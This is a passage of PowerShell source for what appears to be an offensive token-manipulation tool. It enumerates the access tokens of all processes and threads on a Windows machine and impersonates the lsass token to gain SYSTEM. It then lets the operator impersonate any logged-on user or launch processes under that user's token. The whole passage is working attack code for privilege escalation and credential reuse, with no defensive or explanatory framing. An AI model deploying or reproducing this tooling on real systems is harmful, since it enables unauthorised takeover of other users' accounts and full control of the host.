        $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS

        $RetStruct = New-Object PSObject
        [IntPtr]$hThreadToken = [IntPtr]::Zero

        $hThread = $OpenThread.Invoke($Win32Constants.THREAD_ALL_ACCESS, $false, $ThreadId)
        if ($hThread -eq [IntPtr]::Zero)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER) #The thread probably no longer exists
            {
                Write-Warning "Failed to open thread handle for ThreadId: $ThreadId. Error code: $ErrorCode"
            }
        }
        else
        {
            $Success = $OpenThreadToken.Invoke($hThread, $TokenPrivs, $false, [Ref]$hThreadToken)
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if (($ErrorCode -ne $Win32Constants.ERROR_NO_TOKEN) -and  #This error is returned when the thread isn't impersonated
                 ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER)) #Probably means the thread was closed
                {
                    Write-Warning "Failed to call OpenThreadToken for ThreadId: $ThreadId. Error code: $ErrorCode"
                }
            }
            else
            {
                Write-Verbose "Successfully queried thread token"
            }

            #Close the handle to hThread (the thread handle)
            if (-not $CloseHandle.Invoke($hThread))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close thread handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $hThread = [IntPtr]::Zero
        }

        $RetStruct | Add-Member -MemberType NoteProperty -Name hThreadToken -Value $hThreadToken
        return $RetStruct
    }


    function Get-TokenInformation
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken
        )

        $ReturnObj = $null

        $TokenStatsSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_STATISTICS)
        [IntPtr]$TokenStatsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenStatsSize)
        [UInt32]$RealSize = 0
        $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenStatistics, $TokenStatsPtr, $TokenStatsSize, [Ref]$RealSize)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "GetTokenInformation failed. Error code: $ErrorCode"
        }
        else
        {
            $TokenStats = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenStatsPtr, [Type]$TOKEN_STATISTICS)

            #Query LSA to determine what the logontype of the session is that the token corrosponds to, as well as the username/domain of the logon
            $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenStats.AuthenticationId, $LuidPtr, $false)

            [IntPtr]$LogonSessionDataPtr = [IntPtr]::Zero
            $ReturnVal = $LsaGetLogonSessionData.Invoke($LuidPtr, [Ref]$LogonSessionDataPtr)
            if ($ReturnVal -ne 0 -and $LogonSessionDataPtr -eq [IntPtr]::Zero)
            {
                Write-Warning "Call to LsaGetLogonSessionData failed. Error code: $ReturnVal. LogonSessionDataPtr = $LogonSessionDataPtr"
            }
            else
            {
                $LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type]$SECURITY_LOGON_SESSION_DATA)
                if ($LogonSessionData.Username.Buffer -ne [IntPtr]::Zero -and 
                    $LogonSessionData.LoginDomain.Buffer -ne [IntPtr]::Zero)
                {
                    $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.Username.Buffer, $LogonSessionData.Username.Length/2)
                    $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.LoginDomain.Buffer, $LogonSessionData.LoginDomain.Length/2)

                    #If UserName is for the computer account, figure out what account it actually is (SYSTEM, NETWORK SERVICE)
                    #Only do this for the computer account because other accounts return correctly. Also, doing this for a domain account 
                    #results in querying the domain controller which is unwanted.
                    if ($Username -ieq "$($env:COMPUTERNAME)`$")
                    {
                        [UInt32]$Size = 100
                        [UInt32]$NumUsernameChar = $Size / 2
                        [UInt32]$NumDomainChar = $Size / 2
                        [UInt32]$SidNameUse = 0
                        $UsernameBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
                        $DomainBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
                        $Success = $LookupAccountSidW.Invoke([IntPtr]::Zero, $LogonSessionData.Sid, $UsernameBuffer, [Ref]$NumUsernameChar, $DomainBuffer, [Ref]$NumDomainChar, [Ref]$SidNameUse)

                        if ($Success)
                        {
                            $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($UsernameBuffer)
                            $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($DomainBuffer)
                        }
                        else
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning "Error calling LookupAccountSidW. Error code: $ErrorCode"
                        }

                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UsernameBuffer)
                        $UsernameBuffer = [IntPtr]::Zero
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($DomainBuffer)
                        $DomainBuffer = [IntPtr]::Zero
                    }

                    $ReturnObj = New-Object PSObject
                    $ReturnObj | Add-Member -Type NoteProperty -Name Domain -Value $Domain
                    $ReturnObj | Add-Member -Type NoteProperty -Name Username -Value $Username    
                    $ReturnObj | Add-Member -Type NoteProperty -Name hToken -Value $hToken
                    $ReturnObj | Add-Member -Type NoteProperty -Name LogonType -Value $LogonSessionData.LogonType


                    #Query additional info about the token such as if it is elevated
                    $ReturnObj | Add-Member -Type NoteProperty -Name IsElevated -Value $false

                    $TokenElevationSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_ELEVATION)
                    $TokenElevationPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenElevationSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenElevation, $TokenElevationPtr, $TokenElevationSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve TokenElevation status. ErrorCode: $ErrorCode" 
                    }
                    else
                    {
                        $TokenElevation = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenelevationPtr, [Type]$TOKEN_ELEVATION)
                        if ($TokenElevation.TokenIsElevated -ne 0)
                        {
                            $ReturnObj.IsElevated = $true
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenElevationPtr)


                    #Query the token type to determine if the token is a primary or impersonation token
                    $ReturnObj | Add-Member -Type NoteProperty -Name TokenType -Value "UnableToRetrieve"

                    [UInt32]$TokenTypeSize = 4
                    [IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypeSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenType, $TokenTypePtr, $TokenTypeSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        [UInt32]$TokenType = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenTypePtr, [Type][UInt32])
                        switch($TokenType)
                        {
                            1 {$ReturnObj.TokenType = "Primary"}
                            2 {$ReturnObj.TokenType = "Impersonation"}
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)


                    #Query the impersonation level if the token is an Impersonation token
                    if ($ReturnObj.TokenType -ieq "Impersonation")
                    {
                        $ReturnObj | Add-Member -Type NoteProperty -Name ImpersonationLevel -Value "UnableToRetrieve"

                        [UInt32]$ImpersonationLevelSize = 4
                        [IntPtr]$ImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ImpersonationLevelSize) #sizeof uint32
                        [UInt32]$RealSize = 0
                        $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenImpersonationLevel, $ImpersonationLevelPtr, $ImpersonationLevelSize, [Ref]$RealSize)
                        if (-not $Success)
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
                        }
                        else
                        {
                            [UInt32]$ImpersonationLevel = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImpersonationLevelPtr, [Type][UInt32])
                            switch ($ImpersonationLevel)
                            {
                                0 { $ReturnObj.ImpersonationLevel = "SecurityAnonymous" }
                                1 { $ReturnObj.ImpersonationLevel = "SecurityIdentification" }
                                2 { $ReturnObj.ImpersonationLevel = "SecurityImpersonation" }
                                3 { $ReturnObj.ImpersonationLevel = "SecurityDelegation" }
                            }
                        }
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ImpersonationLevelPtr)
                    }
                }
                else
                {
                    Write-Verbose "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $($LogonSessionData.UserName.Length)"
                }

                #Free LogonSessionData
                $ntstatus = $LsaFreeReturnBuffer.Invoke($LogonSessionDataPtr)
                $LogonSessionDataPtr = [IntPtr]::Zero
                if ($ntstatus -ne 0)
                {
                    Write-Warning "Call to LsaFreeReturnBuffer failed. Error code: $ntstatus"
                }
            }

            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
            $LuidPtr = [IntPtr]::Zero
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenStatsPtr)
        $TokenStatsPtr = [IntPtr]::Zero

        return $ReturnObj
    }


    function Get-UniqueTokens
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [Object[]]
            $AllTokens
        )

        $TokenFilter = @{}

        foreach ($Token in $AllTokens)
        {
            $Key = $Token.Domain + "\" + $Token.Username
            if (-not $TokenFilter.ContainsKey($Key))
            {
                #Filter out network logons and junk Windows accounts. This filter eliminates accounts which won't have creds because
                #    they are network logons (type 3) or logons for which the creds don't matter like LOCOAL SERVICE, DWM, etc..
                if ($Token.LogonType -ne 3 -and
                    $Token.Username -inotmatch "^DWM-\d+$" -and
                    $Token.Username -inotmatch "^LOCAL\sSERVICE$")
                {
                    $TokenFilter.Add($Key, $Token)
                }
            }
            else
            {
                #Make sure we are using the most ideal token
                if($Token.IsElevated -eq $true -and $TokenFilter[$Key].IsElevated -ne $true)
                {
                    $TokenFilter[$Key] = $Token
                }
            }
        }

        return $TokenFilter
    }


    function Invoke-ImpersonateUser
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken
        )

        #Duplicate the token so it can be used to create a new process
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken) #todo does this need to be freed
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $Success = $ImpersonateLoggedOnUser.Invoke($NewHToken)
            if (-not $Success)
            {
                $Errorcode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to ImpersonateLoggedOnUser. Error code: $Errorcode"
            }
        }

        $Success = $CloseHandle.Invoke($NewHToken)
        $NewHToken = [IntPtr]::Zero
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
        }

        return $Success
    }


    function Create-ProcessWithToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken,

            [Parameter(Position=1, Mandatory=$true)]
            [String]
            $ProcessName,

            [Parameter(Position=2)]
            [String]
            $ProcessArgs
        )

        #Duplicate the token so it can be used to create a new process
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
            [IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
            $memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize) #The first parameter (cb) is a DWORD which is the size of the struct

            $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
            [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)

            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProcessName)
            $ProcessArgsPtr = [IntPtr]::Zero
            if (-not [String]::IsNullOrEmpty($ProcessArgs))
            {
                $ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProcessArgs)
            }

            $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x2, $ProcessNamePtr, $ProcessArgsPtr, 0x10, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
            if ($Success)
            {
                #Free the handles returned in the ProcessInfo structure
                $ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)
                $CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
                $CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null
            }
            else
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CreateProcessWithTokenW failed. Error code: $ErrorCode"
            }

            #Free StartupInfo memory and ProcessInfo memory
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($StartupInfoPtr)
            $StartupInfoPtr = [Intptr]::Zero
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessInfoPtr)
            $ProcessInfoPtr = [IntPtr]::Zero
            [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ProcessNamePtr)
            $ProcessNamePtr = [IntPtr]::Zero

            #Close handle for the token duplicated with DuplicateTokenEx
            $Success = $CloseHandle.Invoke($NewHToken)
            $NewHToken = [IntPtr]::Zero
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
            }

            <#
            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProcessName)
            $StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
            [IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
            $memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize) #The first parameter (cb) is a DWORD which is the size of the struct

            $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
            [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)

            $Success = $CreateProcessAsUserW.Invoke($NewHToken, $ProcessNamePtr, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x10, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CreateProcessAsUserW had an error. ErrorCode: $ErrorCode"
            }#>
        }
    }


    function Free-AllTokens
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [PSObject[]]
            $TokenInfoObjs
        )

        foreach ($Obj in $TokenInfoObjs)
        {
            $Success = $CloseHandle.Invoke($Obj.hToken)
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose "Failed to close token handle in Free-AllTokens. ErrorCode: $ErrorCode"
            }
            $Obj.hToken = [IntPtr]::Zero
        }
    }


    #Enumerate all tokens on the system. Returns an array of objects with the token and information about the token.
    function Enum-AllTokens
    {
        $AllTokens = @()

        if ([Environment]::UserName -ine "SYSTEM")
        {
            #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
            $lsassTokenInfo = Get-PrimaryToken -ProcessId (Get-Process lsass).Id
            if (-not (Invoke-ImpersonateUser -hToken $lsassTokenInfo.hProcToken))
            {
                Write-Warning "Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"
            }

            $CloseHandle.Invoke($lsassTokenInfo.hProcToken) | Out-Null
            $lsassTokenInfo = $null
        }

        $ProcessIds = get-process | where {$_.name -inotmatch "^csrss$" -and $_.name -inotmatch "^system$" -and $_.id -ne 0}

        #Get all tokens
        foreach ($Process in $ProcessIds)
        {
            [IntPtr]$hToken = [IntPtr](Get-PrimaryToken -ProcessId $Process.Id -FullPrivs).hProcToken

            if ($hToken -ne [IntPtr]::Zero)
            {
                #Get the LUID corrosponding to the logon
                $ReturnObj = Get-TokenInformation -hToken $hToken
                if ($ReturnObj -ne $null)
                {
                    $ReturnObj | Add-Member -MemberType NoteProperty -Name ProcessId -Value $Process.Id

                    $AllTokens += $ReturnObj
                }
            }
            else
            {
                Write-Warning "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id)"
            }

            foreach ($Thread in $Process.Threads)
            {
                $ThreadTokenInfo = Get-ThreadToken -ThreadId $Thread.Id
                [IntPtr]$hToken = ($ThreadTokenInfo.hThreadToken)

                if ($hToken -ne [IntPtr]::Zero)
                {
                    $ReturnObj = Get-TokenInformation -hToken $hToken
                    if ($ReturnObj -ne $null)
                    {
                        $ReturnObj | Add-Member -MemberType NoteProperty -Name ThreadId -Value $Thread.Id
                    
                        $AllTokens += $ReturnObj
                    }
                }
            }
        }

        return $AllTokens
    }


    function Invoke-RevertToSelf
    {
        Param(
            [Parameter(Position=0)]
            [Switch]
            $ShowOutput
        )

        $Success = $RevertToSelf.Invoke()

        if ($ShowOutput)
        {
            if ($Success)
            {
                Write-Output "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
            else
            {
                Write-Output "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
        }
    }


    #Main function
    function Main
    {
        $OriginalUser = [Environment]::UserName

        if ($PsCmdlet.ParameterSetName -ieq "RevToSelf")
        {
            Invoke-RevertToSelf -ShowOutput
        }
        elseif ($PsCmdlet.ParameterSetName -ieq "CreateProcess" -or $PsCmdlet.ParameterSetName -ieq "ImpersonateUser")
        {
            $AllTokens = Enum-AllTokens
            
            #Select the token to use
            $UniqueTokens = Get-UniqueTokens -AllTokens $AllTokens
            if ($Username -ne $null -and $Username -ne '' -and $UniqueTokens.ContainsKey($Username))
            {
                $hToken = $UniqueTokens[$Username].hToken
                Write-Verbose "Selecting token by username"
            }
            elseif ( $ProcessId -ne $null -and $ProcessId -ne 0)
            {
                foreach ($Token in $AllTokens)
                {
                    if ($Token.ProcessId -eq $ProcessId)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose "Selecting token by ProcessID"
                    }
                }
            }
            elseif ($ThreadId -ne $null -and $ThreadId -ne 0)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | Get-Member ThreadId) -and $Token.ThreadId -eq $ThreadId)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose "Selecting token by ThreadId"
                    }
                }
            }

            #Use the token for the selected action
            if ($CreateProcess)
            {
                Invoke-RevertToSelf # todo maybe delete
                Create-ProcessWithToken -hToken $hToken -ProcessName $ProcessName -ProcessArgs $ProcessArgs

                if ($OriginalUser -ine "SYSTEM")
                {
                    Invoke-RevertToSelf
                }
            }
            elseif ($ImpersonateUser)
            {
                Invoke-ImpersonateUser -hToken $hToken | Out-Null
                Write-Output "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }

            Free-AllTokens -TokenInfoObjs $AllTokens
        }
        elseif ($PsCmdlet.ParameterSetName -ieq "WhoAmI")
        {
            Write-Output "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
        else #Default option, which is $enum
        {
            $AllTokens = Enum-AllTokens

            if ($PsCmdlet.ParameterSetName -ieq "ShowAll")
            {
                Write-Output $AllTokens
            }
            else
            {
                $UniqueTokens = Get-UniqueTokens -AllTokens $AllTokens
                Write-Output $UniqueTokens.Values
            }

            if ($OriginalUser -ine "SYSTEM")
            {
                Invoke-RevertToSelf
            }

            Free-AllTokens -TokenInfoObjs $AllTokens
        }
    }


    #Start the main function
    Main
}

